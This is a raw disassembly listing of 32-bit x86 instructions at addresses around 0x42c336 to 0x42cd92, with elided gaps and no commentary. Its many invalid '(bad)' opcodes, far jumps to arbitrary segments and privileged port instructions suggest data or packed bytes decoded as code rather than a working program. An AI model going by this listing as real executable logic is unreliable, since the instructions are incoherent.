  42c336:	pop    ds
  42c337:	mov    edx,DWORD PTR [edx]
  42c339:	jp     0x42c3b7
  42c33b:	fiadd  WORD PTR [eax]
  42c33d:	or     eax,DWORD PTR [edx-0x38]
  42c340:	push   0x0
	...
  42c3b2:	add    BYTE PTR [eax],al
  42c3b4:	mov    al,BYTE PTR [ebp+0x20]
  42c3b7:	out    dx,al
  42c3b8:	out    dx,eax
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx+0x38]
  42c3c1:	rol    DWORD PTR [edi+0x1d3d96e],cl
  42c3c7:	add    ch,dh
  42c3c9:	add    BYTE PTR [eax],al
  42c3cb:	add    BYTE PTR [ecx+0x2519c9b8],dh
  42c3d1:	icebp  
  42c3d2:	popa   
  42c3d3:	mov    eax,0x369fb5b6
  42c3d8:	inc    eax
  42c3d9:	sub    DWORD PTR [edi],ecx
  42c3db:	mov    ah,0x26
  42c3dd:	mov    ds:0xe8327d8,al
  42c3e2:	add    eax,0x5df61def
  42c3e7:	mov    al,ds:0xa277d7d9
  42c3ec:	out    dx,al
  42c3ed:	jmp    0x72fa:0xc33911
  42c3f4:	or     eax,0x457dba19
  42c3f9:	jnp    0x42c423
  42c3fb:	stc    
  42c3fc:	leave  
  42c3fd:	push   ebx
  42c3fe:	dec    ebx
  42c3ff:	or     bh,al
  42c401:	mov    edi,0x9686e24b
  42c406:	sbb    edx,DWORD PTR [esi]
  42c408:	loop   0x42c410
  42c40a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c40b:	(bad)  
  42c40c:	out    0xa1,al
  42c40e:	fldenv [edx*4+0x2c6b2e54]
  42c415:	ja     0x42c409
  42c417:	fisttp QWORD PTR [ebp+0x24acadff]
  42c41d:	cmp    bh,al
  42c41f:	dec    edi
  42c420:	xlat   BYTE PTR ds:[ebx]
  42c421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c422:	loope  0x42c3a4
  42c424:	xor    esi,DWORD PTR [esi]
  42c426:	sbb    eax,0x3bfdc90e
  42c42b:	test   BYTE PTR [edx-0x59],dh
  42c42e:	cs fcomi st,st(4)
  42c431:	mov    BYTE PTR [ebx+0x1815ce07],bl
  42c437:	stos   DWORD PTR es:[edi],eax
  42c438:	mov    eax,0xce578204
  42c43d:	add    ah,bl
  42c43f:	in     eax,0x1d
  42c441:	icebp  
  42c442:	lods   eax,DWORD PTR ds:[esi]
  42c443:	js     0x42c42d
  42c445:	fwait
  42c446:	scas   al,BYTE PTR es:[edi]
  42c447:	dec    ebp
  42c448:	push   es
  42c449:	pop    edi
  42c44a:	shl    bh,1
  42c44c:	mov    bh,0xe3
  42c44e:	and    eax,0x32cce55a
  42c453:	jmp    0x27b6:0x1c6ff4d1
  42c45a:	sbb    al,0x8c
  42c45c:	sbb    eax,0xa2a18c6b
  42c461:	out    dx,eax
  42c462:	sub    ebp,ebp
  42c464:	out    0xff,al
  42c466:	inc    esp
  42c467:	test   al,0x65
  42c469:	dec    ebx
  42c46a:	sub    BYTE PTR [ebx+0x1e425e1b],al
  42c470:	sbb    eax,0x9bad9a29
  42c475:	push   edx
  42c476:	(bad)  
  42c477:	test   DWORD PTR [esi-0x32],0x6ce42558
  42c47e:	or     al,0xcc
  42c480:	push   ss
  42c481:	out    0xd1,eax
  42c483:	push   cs
  42c484:	xchg   DWORD PTR [edi+0x3d7f36e8],esp
  42c48a:	inc    ebx
  42c48b:	rol    DWORD PTR [edx+0x1],1
  42c48e:	rol    DWORD PTR [esi],cl
  42c490:	scas   eax,DWORD PTR es:[edi]
  42c491:	rol    edi,1
  42c493:	jbe    0x42c4b2
  42c495:	adc    BYTE PTR [esi],0x6
  42c498:	sub    DWORD PTR [ebx],edi
  42c49a:	repnz leave 
  42c49c:	(bad)  
  42c49d:	xchg   ebp,eax
  42c49e:	mov    dh,0x5b
  42c4a0:	sub    ebp,DWORD PTR [edi+eiz*2+0x5f]
  42c4a4:	neg    dl
  42c4a6:	pusha  
  42c4a7:	lods   eax,DWORD PTR ds:[esi]
  42c4a8:	sti    
  42c4a9:	mov    cs,WORD PTR [esi-0x4b]
  42c4ac:	aad    0xb6
  42c4ae:	pushw  ss
  42c4b0:	iret   
  42c4b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c4b2:	push   dx
  42c4b4:	mov    ebx,0xc918da02
  42c4b9:	jmp    0x700ddcdd
  42c4be:	fild   WORD PTR [edx-0xb]
	...
  42c531:	add    BYTE PTR [eax],al
  42c533:	add    al,ah
  42c535:	xchg   esp,eax
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	(bad)  
  42c541:	jecxz  0x42c4f5
  42c543:	retf   0xd4ce
  42c546:	add    DWORD PTR [eax],eax
  42c548:	cmc    
  42c549:	add    BYTE PTR [eax],al
  42c54b:	add    BYTE PTR [ebx+0x5d],cl
  42c54e:	loopne 0x42c592
  42c550:	sbb    al,0x16
  42c552:	repnz push ebp
  42c554:	test   edi,esp
  42c556:	stos   BYTE PTR es:[edi],al
  42c557:	dec    ecx
  42c558:	pusha  
  42c559:	es je  0x42c517
  42c55c:	sub    al,BYTE PTR [edi-0x2d]
  42c55f:	jno    0x42c532
  42c561:	mov    ds:0xdcb8219d,al
  42c566:	data16 cli 
  42c568:	aam    0x66
  42c56a:	scas   al,BYTE PTR es:[edi]
  42c56b:	fdivrp st(5),st
  42c56d:	xchg   edi,eax
  42c56e:	or     ebx,DWORD PTR [ecx+0x74]
  42c571:	and    al,0xce
  42c573:	int3   
  42c574:	mov    WORD PTR [ebp-0x7c],ss
  42c577:	scas   al,BYTE PTR es:[edi]
  42c578:	adc    al,BYTE PTR [eax+0x2bc52906]
  42c57e:	adc    eax,0x8b4a5931
  42c583:	jbe    0x42c548
  42c585:	sub    dl,BYTE PTR [edx]
  42c587:	or     DWORD PTR [edi+0x30],esp
  42c58a:	dec    eax
  42c58b:	bound  eax,QWORD PTR [edx-0x407976bb]
  42c591:	adc    al,0x89
  42c593:	sub    ebx,DWORD PTR [edx-0x2b13156]
  42c599:	mov    ch,0x68
  42c59b:	or     BYTE PTR [eax-0x4c31938c],bh
  42c5a1:	adc    al,BYTE PTR [esi+0x4b]
  42c5a4:	mov    ebp,0x4cf684e7
  42c5a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5aa:	mov    ebp,0xd99d89d7
  42c5af:	les    edi,FWORD PTR [edx-0x5b26fbff]
  42c5b5:	nop
  42c5b6:	pop    ecx
  42c5b7:	push   esi
  42c5b8:	out    dx,al
  42c5b9:	scas   al,BYTE PTR es:[edi]
  42c5ba:	inc    edx
  42c5bb:	mov    esp,0x18666358
  42c5c0:	push   cs
  42c5c1:	xor    eax,ecx
  42c5c3:	(bad)  
  42c5c4:	(bad)  
  42c5c5:	ds (bad) 
  42c5c7:	leave  
  42c5c8:	call   0xe592:0xcb86a02e
  42c5cf:	rol    DWORD PTR [ebp+edi*2+0x6df47431],cl
  42c5d6:	mov    BYTE PTR [ebp-0x1e],dh
  42c5d9:	mov    al,ds:0x2e5a7c9a
  42c5de:	hlt    
  42c5df:	xor    edx,DWORD PTR [ecx]
  42c5e1:	popa   
  42c5e2:	adc    eax,eax
  42c5e4:	pop    es
  42c5e5:	int3   
  42c5e6:	dec    edx
  42c5e7:	dec    esp
  42c5e8:	sahf   
  42c5e9:	mov    eax,0xea43e93a
  42c5ee:	inc    eax
  42c5ef:	scas   eax,DWORD PTR es:[edi]
  42c5f0:	sbb    BYTE PTR [esp+ebp*4-0x75],ch
  42c5f4:	jae    0x42c658
  42c5f6:	(bad)  
  42c5f7:	pop    edi
  42c5f8:	cmp    eax,0x50ef529c
  42c5fd:	js     0x42c646
  42c5ff:	fwait
  42c600:	mov    ebx,0x14fad81a
  42c605:	xor    esi,DWORD PTR [esi]
  42c607:	shl    esi,0xff
  42c60a:	mov    ebp,0x75ffcb8d
  42c60f:	sub    BYTE PTR [esi+0x9],ch
  42c612:	(bad)  
  42c613:	push   ebx
  42c614:	aad    0x74
  42c616:	push   edx
  42c617:	fs push cs
  42c619:	(bad)  
  42c61a:	jmp    0x761f3187
  42c61f:	jmp    0xff03:0xbc7d99d0
  42c626:	pop    esi
  42c627:	sbb    BYTE PTR ds:0x3c064fc2,0xe4
  42c62e:	xor    DWORD PTR [ebx+edi*1+0x56ed75b],edx
  42c635:	(bad)  
  42c636:	je     0x42c5ee
  42c638:	xor    ebp,DWORD PTR [eax+0x10]
  42c63b:	cmp    esp,DWORD PTR [esi+edx*1+0x164bf2]
	...
  42c6b2:	add    BYTE PTR [eax],al
  42c6b4:	dec    esi
  42c6b5:	inc    edx
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0x22be,0xce
  42c6c2:	jbe    0x42c730
  42c6c4:	ret    
  42c6c5:	aad    0x1
  42c6c7:	add    ch,dh
  42c6c9:	add    BYTE PTR [eax],al
  42c6cb:	add    BYTE PTR [ebx-0x5b2d4a5e],dh
  42c6d1:	pop    ds
  42c6d2:	xor    BYTE PTR [ebx],cl
  42c6d4:	mov    eax,ds:0x2dca1cf8
  42c6d9:	ficomp WORD PTR [esi]
  42c6db:	repz mov dh,0x29
  42c6de:	ins    DWORD PTR es:[edi],dx
  42c6df:	mov    esi,0x5a594433
  42c6e4:	or     eax,0x48d4d692
  42c6e9:	mov    DWORD PTR [edx*4-0x376fe95a],esp
  42c6f0:	inc    eax
  42c6f1:	repnz lds eax,FWORD PTR es:[ebp+0x61]
  42c6f6:	pop    eax
  42c6f7:	xchg   esp,eax
  42c6f8:	mov    dh,0x19
  42c6fa:	js     0x42c6b5
  42c6fc:	fwait
  42c6fd:	cli    
  42c6fe:	test   sp,cx
  42c701:	push   edi
  42c702:	or     dh,BYTE PTR [ebx+0x52]
  42c705:	mov    ebp,0xc24ee963
  42c70a:	and    BYTE PTR [edx],al
  42c70c:	call   0xf0211d11
  42c711:	cmp    edx,DWORD PTR [ecx+0x3152d756]
  42c717:	aas    
  42c718:	push   es
  42c719:	clc    
  42c71a:	mov    al,0x3
  42c71c:	add    edi,DWORD PTR [edx+0x48]
  42c71f:	add    BYTE PTR [esi+0xd],bh
  42c722:	xchg   ebp,eax
  42c723:	cmp    eax,0x3e6de446
  42c728:	push   edi
  42c729:	and    DWORD PTR [ebx],eax
  42c72b:	sbb    al,0x47
  42c72d:	(bad)  
  42c72e:	cmp    DWORD PTR [eax],esi
  42c730:	sub    DWORD PTR [ebx],ecx
  42c732:	outs   dx,DWORD PTR ds:[esi]
  42c733:	or     eax,0x359314e6
  42c738:	test   eax,0x8ba1411c
  42c73d:	call   0x8182597e
  42c742:	pop    ecx
  42c743:	xchg   edx,eax
  42c744:	jp     0x42c6d6
  42c746:	mov    edx,0x754c535d
  42c74b:	loop   0x42c747
  42c74d:	popa   
  42c74e:	xor    cl,bl
  42c750:	jne    0x42c78b
  42c752:	xchg   esi,eax
  42c753:	daa    
  42c754:	mov    ebx,0x5b502662
  42c759:	jl     0x42c768
  42c75b:	sar    DWORD PTR [esi+0x1c8d4496],0xb9
  42c762:	pop    eax
  42c763:	pop    esp
  42c764:	mov    WORD PTR [ebx],ss
  42c766:	jp     0x42c769
  42c768:	push   DWORD PTR [ecx]
  42c76a:	dec    esi
  42c76b:	xor    dl,BYTE PTR [edx-0x6d503d77]
  42c771:	cmp    eax,0xc015f1e3
  42c776:	scas   eax,DWORD PTR es:[edi]
  42c777:	xor    DWORD PTR [edx+0x3cfc90ab],esp
  42c77d:	adc    al,0xf
  42c77f:	pop    esi
  42c780:	jb     0x42c7bf
  42c782:	pop    edx
  42c783:	mov    ds:0x702110eb,al
  42c788:	pop    esi
  42c789:	add    DWORD PTR [ebp-0x4b3b25f1],ebx
  42c78f:	repz dec esp
  42c791:	clc    
  42c792:	xchg   ecx,eax
  42c793:	inc    esp
  42c794:	mov    eax,0x7dd96aa7
  42c799:	jmp    0x7a64:0x8feffd97
  42c7a0:	scas   eax,DWORD PTR es:[edi]
  42c7a1:	mov    ds:0xc1d5ac27,eax
  42c7a6:	call   DWORD PTR [ebp-0x1f]
  42c7a9:	xchg   edx,eax
  42c7aa:	sub    dl,BYTE PTR [ebp+0x77]
  42c7ad:	or     al,0xb3
  42c7af:	ret    0x4d42
  42c7b2:	sti    
  42c7b3:	lock aam 0x9e
  42c7b6:	adc    DWORD PTR [bx+si-0x8],ecx
  42c7ba:	push   ebp
  42c7bb:	push   ss
  42c7bc:	mov    dl,0xad
  42c7be:	push   0x68
  42c7c0:	fild   DWORD PTR [eax]
	...
  42c832:	add    BYTE PTR [eax],al
  42c834:	call   0x2a86d6
  42c839:	out    0xf9,eax
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0x710a6ea
  42c844:	mov    eax,0xf50001d6
  42c849:	add    BYTE PTR [eax],al
  42c84b:	add    BYTE PTR [ebp-0x29],bl
  42c84e:	lods   eax,DWORD PTR ds:[esi]
  42c84f:	xor    eax,0xfaa08306
  42c854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c855:	sar    BYTE PTR [esi-0x3b],cl
  42c858:	ins    BYTE PTR es:[edi],dx
  42c859:	mov    dh,0x86
  42c85b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c85d:	mov    ebp,DWORD PTR [edi-0xd]
  42c860:	das    
  42c861:	sub    eax,0x2d7e70c0
  42c866:	ja     0x42c855
  42c868:	pop    ds
  42c869:	push   es
  42c86a:	lods   eax,DWORD PTR ds:[esi]
  42c86b:	(bad)  
  42c86d:	adc    BYTE PTR [edi-0x1b769e1],ah
  42c873:	and    BYTE PTR [ebx],ch
  42c875:	mov    ds:0x354498b5,eax
  42c87a:	loope  0x42c87d
  42c87c:	or     al,0x9f
  42c87e:	inc    esi
  42c87f:	jo     0x42c88f
  42c881:	(bad)  
  42c882:	shl    ch,1
  42c884:	rol    BYTE PTR [edi+0x7f],cl
  42c887:	fs push 0xffffffc1
  42c88a:	cmp    esi,eax
  42c88c:	jmp    0x877e:0xe9518896
  42c893:	mov    dl,BYTE PTR [edi+0x2e]
  42c896:	(bad)  
  42c898:	gs in  al,0xf9
  42c89b:	jb     0x42c91b
  42c89d:	push   esi
  42c89e:	cli    
  42c89f:	(bad)  
  42c8a1:	imul   BYTE PTR [ecx+ecx*8+0x5]
  42c8a5:	pop    esi
  42c8a6:	mov    WORD PTR [edx+ecx*2+0x1bdb7e5b],ds
  42c8ad:	mov    bh,0x29
  42c8af:	bound  esp,QWORD PTR [edx]
  42c8b1:	xchg   edx,eax
  42c8b2:	fiadd  DWORD PTR [ecx]
  42c8b4:	in     eax,dx
  42c8b5:	inc    eax
  42c8b6:	cli    
  42c8b7:	ins    BYTE PTR es:[edi],dx
  42c8b8:	mov    edi,0x87436319
  42c8bd:	dec    ebx
  42c8be:	mov    bl,0x11
  42c8c0:	jp     0x42c919
  42c8c2:	add    eax,0xdfabd447
  42c8c7:	retf   0x62b0
  42c8ca:	jl     0x42c92a
  42c8cc:	jb     0x42c8e4
  42c8ce:	pusha  
  42c8cf:	bound  eax,QWORD PTR [ecx+eiz*8+0x7e2b2427]
  42c8d6:	ror    DWORD PTR [ebx-0x60],1
  42c8d9:	repnz cmp bl,BYTE PTR [eax+esi*4-0x5909a6c3]
  42c8e1:	sbb    ch,BYTE PTR [ecx-0x63]
  42c8e4:	pop    edx
  42c8e5:	arpl   sp,sp
  42c8e7:	pop    es
  42c8e8:	lock xchg esp,eax
  42c8ea:	push   eax
  42c8eb:	mov    eax,0x41de8c5e
  42c8f0:	mov    WORD PTR [edi+0x69f25f1e],es
  42c8f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8f7:	sahf   
  42c8f8:	or     al,0x78
  42c8fa:	mov    bh,dh
  42c8fc:	or     edx,DWORD PTR [esp+ecx*8]
  42c8ff:	mov    WORD PTR [eax],ds
  42c901:	adc    BYTE PTR [ecx-0x13],bl
  42c904:	out    0x1c,eax
  42c906:	xlat   BYTE PTR ds:[ebx]
  42c907:	test   dh,ch
  42c909:	mov    ds:0x654081c7,al
  42c90e:	add    dl,BYTE PTR cs:[edx+0x623f17ea]
  42c915:	xlat   BYTE PTR ds:[ebx]
  42c916:	retf   0x51aa
  42c919:	add    al,0xe7
  42c91b:	inc    eax
  42c91c:	fisub  DWORD PTR [esi-0x6e209abb]
  42c922:	div    DWORD PTR [ebx+ebp*2]
  42c925:	add    eax,0xdc06f705
  42c92a:	inc    ebp
  42c92b:	pusha  
  42c92c:	ret    0x88ae
  42c92f:	or     esi,0xcd9f8e1b
  42c935:	inc    esi
  42c936:	mov    al,ds:0x6d1a0284
  42c93b:	(bad)  
  42c93c:	jmp    0x0:0x8bf87664
	...
  42c9b3:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42c9b9:	neg    ebx
  42c9bb:	outs   dx,DWORD PTR ds:[esi]
  42c9bc:	mov    ch,0xda
  42c9be:	push   esi
  42c9bf:	and    dl,BYTE PTR [ebp-0x5243315e]
  42c9c5:	xlat   BYTE PTR ds:[ebx]
  42c9c6:	add    DWORD PTR [eax],eax
  42c9c8:	cmc    
  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    bh,dl
  42c9cd:	test   eax,0x386abbd0
  42c9d2:	pushf  
  42c9d3:	xlat   BYTE PTR ds:[ebx]
  42c9d4:	pop    ebx
  42c9d5:	(bad)  
  42c9d6:	int    0x85
  42c9d8:	mov    ch,0x17
  42c9da:	hlt    
  42c9db:	lds    ebx,FWORD PTR [ebx+0x70a30d1b]
  42c9e1:	xor    ecx,DWORD PTR [ebp+0x495bfbf9]
  42c9e7:	out    dx,al
  42c9e8:	outs   dx,BYTE PTR ds:[esi]
  42c9e9:	sub    al,0x1f
  42c9eb:	imul   esi,DWORD PTR [ecx],0x745a694c
  42c9f1:	das    
  42c9f2:	add    edi,edx
  42c9f4:	aam    0x15
  42c9f6:	or     BYTE PTR [esi],bh
  42c9f8:	jmp    0x2934bb71
  42c9fd:	push   eax
  42c9fe:	enter  0x9a6d,0xa
  42ca02:	inc    ebp
  42ca03:	xor    DWORD PTR [edi],ebp
  42ca05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca07:	mov    edx,0x645e578f
  42ca0c:	mov    bl,0x11
  42ca0e:	mov    ecx,0xd58aa7d7
  42ca13:	inc    esi
  42ca14:	icebp  
  42ca15:	aam    0x3d
  42ca17:	cwde   
  42ca18:	adc    eax,0x4c37fa93
  42ca1d:	mov    ebx,0xcdedfc99
  42ca22:	pop    esp
  42ca23:	popf   
  42ca24:	jns    0x42c9f8
  42ca26:	and    bh,ch
  42ca28:	inc    ebx
  42ca29:	shr    edi,0xfd
  42ca2c:	sub    DWORD PTR [eax+0x43dd57a4],0xfffffffd
  42ca33:	dec    edi
  42ca34:	xchg   ebp,eax
  42ca35:	shl    ch,0x70
  42ca38:	dec    ecx
  42ca39:	pop    ss
  42ca3a:	push   ss
  42ca3b:	repnz loope 0x42ca24
  42ca3e:	nop
  42ca3f:	dec    edi
  42ca40:	scas   al,BYTE PTR es:[edi]
  42ca41:	push   esp
  42ca42:	mov    dl,0xde
  42ca44:	(bad)  
  42ca45:	cld    
  42ca46:	nop
  42ca47:	mov    edi,?
  42ca49:	lds    edx,FWORD PTR [esi+ebp*1-0x65]
  42ca4d:	scas   eax,DWORD PTR es:[edi]
  42ca4e:	pop    ebp
  42ca4f:	jmp    0x1d4eb7a8
  42ca54:	and    eax,0xcfdf24a5
  42ca59:	jns    0x42cad5
  42ca5b:	sti    
  42ca5c:	fidiv  WORD PTR [ecx]
  42ca5e:	(bad)  
  42ca5f:	push   cs
  42ca60:	into   
  42ca61:	cwde   
  42ca62:	dec    edx
  42ca63:	add    dl,BYTE PTR [edx]
  42ca65:	fadd   QWORD PTR [ecx-0x5e]
  42ca68:	popf   
  42ca69:	pop    eax
  42ca6a:	stos   DWORD PTR es:[edi],eax
  42ca6b:	lock dec ebx
  42ca6d:	iret   
  42ca6e:	fld    TBYTE PTR [ebx]
  42ca70:	pop    ss
  42ca71:	clc    
  42ca72:	scas   al,BYTE PTR es:[edi]
  42ca73:	mov    ss,edi
  42ca75:	retf   0x5a6e
  42ca78:	mov    ecx,0x8236d284
  42ca7d:	cwde   
  42ca7e:	jno    0x42ca8f
  42ca80:	mov    bh,0xd7
  42ca82:	sbb    edx,eax
  42ca84:	sbb    BYTE PTR [ebx],dh
  42ca86:	ja     0x42ca6b
  42ca88:	(bad)  
  42ca89:	lods   al,BYTE PTR cs:[esi]
  42ca8b:	jns    0x42ca28
  42ca8d:	test   eax,0xae416a98
  42ca92:	jmp    0x42ca6b
  42ca94:	fild   QWORD PTR [esi]
  42ca96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca97:	not    al
  42ca99:	(bad)  
  42ca9a:	xor    dh,BYTE PTR [esi]
  42ca9c:	or     al,0x60
  42ca9e:	adc    ecx,DWORD PTR [ecx+0x14]
  42caa1:	(bad)  
  42caa3:	enter  0x3a5c,0x2f
  42caa7:	mov    ecx,0xd192e55d
  42caac:	dec    eax
  42caad:	test   BYTE PTR [edx+0xf],al
  42cab0:	pop    eax
  42cab1:	cs fsub st(3),st
  42cab4:	mov    bl,BYTE PTR [eax+0x55]
  42cab7:	and    bh,cl
  42cab9:	cmovg  ebp,DWORD PTR [edi]
  42cabc:	lea    eax,[ebp+0xe]
  42cabf:	mov    WORD PTR [edi+0x0],ss
	...
  42cb31:	add    BYTE PTR [eax],al
  42cb33:	add    BYTE PTR [eax+ebp*1],dh
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	(bad)  
  42cb41:	fs fwait
  42cb43:	push   eax
  42cb44:	mov    ds:0xf50001d8,al
  42cb49:	add    BYTE PTR [eax],al
  42cb4b:	add    BYTE PTR [edx],dl
  42cb4d:	rol    ecx,cl
  42cb4f:	clc    
  42cb50:	into   
  42cb51:	xor    al,0xbd
  42cb53:	mov    ecx,0xc14f6507
  42cb58:	outs   dx,DWORD PTR ds:[esi]
  42cb59:	push   eax
  42cb5a:	ret    
  42cb5b:	xor    eax,0xc0960ede
  42cb60:	ins    BYTE PTR es:[edi],dx
  42cb61:	shl    BYTE PTR [edi+0x398a9880],0x7b
  42cb68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb69:	ins    WORD PTR es:[edi],dx
  42cb6b:	mov    ebx,edx
  42cb6d:	jp     0x42cbc3
  42cb6f:	mov    ebx,0xa5aa22d9
  42cb74:	fs pop ebp
  42cb76:	test   DWORD PTR [ecx],ecx
  42cb78:	mov    ds,WORD PTR [ebp-0x1a]
  42cb7b:	iret   
  42cb7c:	in     eax,dx
  42cb7d:	scas   eax,DWORD PTR es:[edi]
  42cb7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb7f:	test   dl,dl
  42cb81:	in     al,dx
  42cb82:	sbb    DWORD PTR [esi],ebp
  42cb84:	inc    ebp
  42cb85:	adc    dh,ah
  42cb87:	push   edi
  42cb88:	mov    cl,BYTE PTR [ebx+0x5d7d294e]
  42cb8e:	in     al,dx
  42cb8f:	lahf   
  42cb90:	in     eax,0x28
  42cb92:	mov    bh,BYTE PTR [edx+0x5f0148c]
  42cb98:	stos   BYTE PTR es:[edi],al
  42cb99:	in     eax,0x8c
  42cb9b:	jmp    0xa0a6a62e
  42cba0:	rcl    BYTE PTR [edi+0x68ed656c],cl
  42cba6:	inc    ebx
  42cba7:	mov    ch,0x77
  42cba9:	lahf   
  42cbaa:	(bad)
  42cbaf:	icebp  
  42cbb0:	pop    esp
  42cbb1:	ja     0x42cc2c
  42cbb3:	stos   DWORD PTR es:[edi],eax
  42cbb4:	adc    eax,0xbec07709
  42cbb9:	xchg   ebx,eax
  42cbba:	sbb    DWORD PTR [ebx-0x4742cf03],ebx
  42cbc0:	and    edx,ecx
  42cbc2:	std    
  42cbc3:	arpl   WORD PTR [eax],bp
  42cbc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cbc6:	test   al,0xc7
  42cbc9:	js     0x42cc09
  42cbcb:	test   DWORD PTR [esi+0x75445829],eax
  42cbd1:	add    bh,BYTE PTR [ebx]
  42cbd3:	je     0x42cc15
  42cbd5:	scas   eax,DWORD PTR es:[edi]
  42cbd6:	xchg   esp,eax
  42cbd7:	sbb    eax,0xa4e8b536
  42cbdc:	hlt    
  42cbdd:	mov    dl,0x63
  42cbdf:	test   bl,cl
  42cbe1:	(bad)  
  42cbe2:	ror    bh,0xeb
  42cbe5:	or     al,0xcf
  42cbe7:	gs pop ebp
  42cbe9:	mov    bh,0xba
  42cbeb:	xor    eax,0x5a88129d
  42cbf0:	xor    eax,0x66ef0c08
  42cbf5:	repz cmp bl,bl
  42cbf8:	add    DWORD PTR [eax+0x3fc5d0f2],0xeb4367f7
  42cc02:	mov    eax,ds:0x50faa489
  42cc07:	inc    edx
  42cc08:	aaa    
  42cc09:	icebp  
  42cc0a:	fcom   DWORD PTR [ebp+0x338dffaf]
  42cc10:	imul   esi,DWORD PTR [ebx],0xd5d705bb
  42cc16:	xchg   ebx,eax
  42cc17:	les    eax,FWORD PTR [edi+0x25834061]
  42cc1d:	mov    ah,BYTE PTR [edx+eax*2]
  42cc20:	test   dl,ah
  42cc22:	out    0x7d,eax
  42cc24:	mov    eax,0x771f94c6
  42cc29:	xchg   ecx,eax
  42cc2b:	gs mov eax,0xdcf8e6fb
  42cc31:	mov    DWORD PTR [edi-0x724fcaff],0xe6c1347b
  42cc3b:	push   edx
  42cc3c:	add    eax,0xf0d7e8ec
	...
  42ccb1:	add    BYTE PTR [eax],al
  42ccb3:	add    BYTE PTR [eax-0x61eb634a],dh
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    edi,DWORD PTR [esi]
  42ccc1:	push   eax
  42ccc2:	and    cl,BYTE PTR [edi+edx*4-0xafffe27]
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    BYTE PTR [ebx],dl
  42cccd:	call   0xfac8:0x74a57f10
  42ccd4:	dec    edx
  42ccd5:	rcl    BYTE PTR [edx-0x20],cl
  42ccd8:	lock adc DWORD PTR [ecx+0x2],esp
  42ccdc:	aad    0xff
  42ccde:	xor    ah,cl
  42cce0:	outs   dx,BYTE PTR ds:[esi]
  42cce1:	sbb    DWORD PTR [esi+eax*8+0x59610532],esi
  42cce8:	data16 test al,0xc1
  42cceb:	rcr    DWORD PTR [esp+esi*8-0x160eae61],cl
  42ccf2:	loopne 0x42cd11
  42ccf4:	inc    eax
  42ccf5:	xchg   edi,eax
  42ccf6:	icebp  
  42ccf7:	scas   al,BYTE PTR es:[edi]
  42ccf8:	add    al,0x87
  42ccfa:	cmovl  ecx,DWORD PTR [ebp+0xedc7fd0]
  42cd01:	jg     0x42cce2
  42cd03:	pushf  
  42cd04:	or     DWORD PTR [edx+0x3f],esp
  42cd07:	jmp    0xc4e9fecb
  42cd0c:	add    cl,BYTE PTR [edx-0x47f1f72b]
  42cd12:	xor    eax,DWORD PTR [edi-0x2a696803]
  42cd18:	xchg   ebp,eax
  42cd19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd1a:	push   ss
  42cd1b:	dec    eax
  42cd1c:	rcr    BYTE PTR [edx-0x6449ab61],1
  42cd22:	mov    cl,0x8d
  42cd24:	push   ss
  42cd25:	dec    edi
  42cd26:	mov    cl,0xef
  42cd28:	in     al,dx
  42cd29:	das    
  42cd2a:	cmp    DWORD PTR [esp+esi*4-0x3],ebx
  42cd2e:	inc    ecx
  42cd2f:	mov    ebx,0x8dd573f2
  42cd34:	jecxz  0x42ccdf
  42cd36:	jecxz  0x42cd9e
  42cd38:	adc    eax,edx
  42cd3a:	or     ch,BYTE PTR [ecx-0x56]
  42cd3d:	dec    ecx
  42cd3e:	cmp    al,0xb3
  42cd40:	mov    al,ds:0x94b1d4a9
  42cd45:	bound  esi,QWORD PTR [ecx]
  42cd47:	cmc    
  42cd48:	add    al,0x7
  42cd4a:	je     0x42cd93
  42cd4c:	or     al,0x4d
  42cd4e:	add    ebx,0xe8dcae44
  42cd54:	dec    esi
  42cd55:	pusha  
  42cd56:	into   
  42cd57:	les    edi,FWORD PTR [edx+0x5f0ecb5c]
  42cd5d:	fiadd  WORD PTR [edi]
  42cd5f:	xchg   esp,eax
  42cd60:	inc    edx
  42cd61:	pop    esi
  42cd62:	enter  0xf306,0x77
  42cd66:	push   ecx
  42cd67:	call   0x558e72bd
  42cd6c:	vshufps xmm1,xmm0,xmm1,0x24
  42cd71:	push   esi
  42cd72:	jno    0x42cd61
  42cd74:	adc    ebx,DWORD PTR [ebx]
  42cd76:	scas   al,BYTE PTR es:[edi]
  42cd77:	pop    eax
  42cd78:	mov    cl,0x7a
  42cd7a:	pop    ebx
  42cd7b:	or     ebp,DWORD PTR [ecx-0x2a]
  42cd7e:	outs   dx,BYTE PTR ds:[esi]
  42cd7f:	test   eax,0x9d3c34a5
  42cd84:	ss mov bl,0x9f
  42cd87:	cwde   
  42cd88:	in     eax,0x45
  42cd8a:	cmp    al,0x48
  42cd8c:	loopne 0x42cd35
  42cd8e:	jge    0x42cd2a
  42cd90:	dec    ebx
  42cd91:	fwait
  42cd92:	push   ebx
